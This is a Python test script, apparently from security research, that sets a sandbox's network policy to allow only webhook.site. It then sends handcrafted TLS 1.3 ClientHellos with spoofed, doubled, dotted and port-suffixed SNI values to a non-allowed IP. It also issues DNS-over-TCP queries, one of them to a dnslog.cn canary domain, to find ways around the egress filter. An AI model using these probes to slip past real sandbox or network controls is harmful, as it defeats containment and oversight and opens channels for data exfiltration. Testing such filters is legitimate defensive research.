# -*- coding: utf-8 -*-
"""Phase15: 合法 TLS1.3 CH 重测 SNI 变体 + DNS over TCP 过滤判别"""
import sys, time, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

SID = fresh_sandbox_deny_all("fwtest7")

GUEST = r'''
import socket, struct, time, os

def tls13_ch(snis):
    # legal TLS1.3 ClientHello: supported_versions + key_share(X25519) + optional SNIs
    body = b'\x03\x03' + os.urandom(32) + b'\x00' + b'\x00\x02\x13\x01' + b'\x01\x00'
    ext = b''
    # supported_versions: TLS1.3
    ext += b'\x00\x2b\x00\x03\x02\x03\x04'
    # key_share X25519 (dummy pubkey)
    ext += b'\x00\x33\x00\x24\x00\x1d\x00\x20' + b'\x00' * 32
    # server_names (may be multiple)
    for sni in snis:
        n = sni.encode()
        ext += b'\x00\x00' + struct.pack('>H', len(n) + 5) + b'\x00' + bytes([len(n)]) + n
    body += struct.pack('>H', len(ext)) + ext
    hs = b'\x01' + len(body).to_bytes(3, 'big') + body
    return b'\x16\x03\x01' + struct.pack('>H', len(hs)) + hs

def tls_probe(ip, port, snis, label=''):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((ip, port))
        s.sendall(tls13_ch(snis))
        try:
            r = s.recv(200)
            if r.startswith(b'\x16'):
                print('[%s %s:%d] ServerHello! len=%d' % (label, ip, port, len(r)), flush=True)
            else:
                print('[%s %s:%d] resp: %r' % (label, ip, port, r[:50]), flush=True)
        except socket.timeout:
            print('[%s %s:%d] TIMEOUT' % (label, ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s: %s' % (label, ip, port, type(e).__name__, e), flush=True)

def dns_tcp(domain, label=''):
    try:
        q = b''
        for part in domain.split('.'):
            q += bytes([len(part)]) + part.encode()
        q += b'\x00'
        msg = b'\x12\x35\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + q + b'\x00\x01\x00\x01'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect(('172.31.0.2', 53))
        s.sendall(struct.pack('>H', len(msg)) + msg)
        r = s.recv(600)
        if len(r) >= 14:
            flags = r[4:6]
            an = struct.unpack('>H', r[8:10])[0]
            print('[dns-tcp %s] flags=%s an=%d body=%r' % (label, flags.hex(), an, r[12:80]), flush=True)
        else:
            print('[dns-tcp %s] short resp %r' % (label, r), flush=True)
        s.close()
    except Exception as e:
        print('[dns-tcp %s] EXC %s' % (label, e), flush=True)

# --- A: 合法 TLS1.3 CH 对照 ---
tls_probe('178.63.67.153', 443, ['webhook.site'], 'ctrl-wh')        # 期望 ServerHello
tls_probe('34.195.135.204', 443, ['httpbin.org'], 'ctrl-np')        # 期望拒
tls_probe('34.195.135.204', 443, ['webhook.site'], 'np-ip+wh-sni')  # 按SNI转发的判别
# --- B: SNI 变体 ---
tls_probe('34.195.135.204', 443, ['httpbin.org', 'webhook.site'], 'dual-np+wh')
tls_probe('34.195.135.204', 443, ['webhook.site', 'httpbin.org'], 'dual-wh+np')
tls_probe('34.195.135.204', 443, ['webhook.site.'], 'dot-sni')
tls_probe('34.195.135.204', 443, ['webhook.site:443'], 'port-sni')
# --- C: DNS over TCP 过滤 ---
dns_tcp('webhook.site', 'whitelisted')
dns_tcp('httpbin.org', 'non-whitelisted')
dns_tcp('vckxg8.dnslog.cn', 'dnslog')
print('done', flush=True)
'''

code = "cat > /tmp/pg23.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg23.py"

if __name__ == "__main__":
    body = {"mode": "custom", "allowedDomains": ["webhook.site"]}
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (SID, TEAM), body)
    print('set custom:', c, flush=True)
    time.sleep(2)
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=120000)
    print('cmd:', c, flush=True)
    print(r[:5500], flush=True)
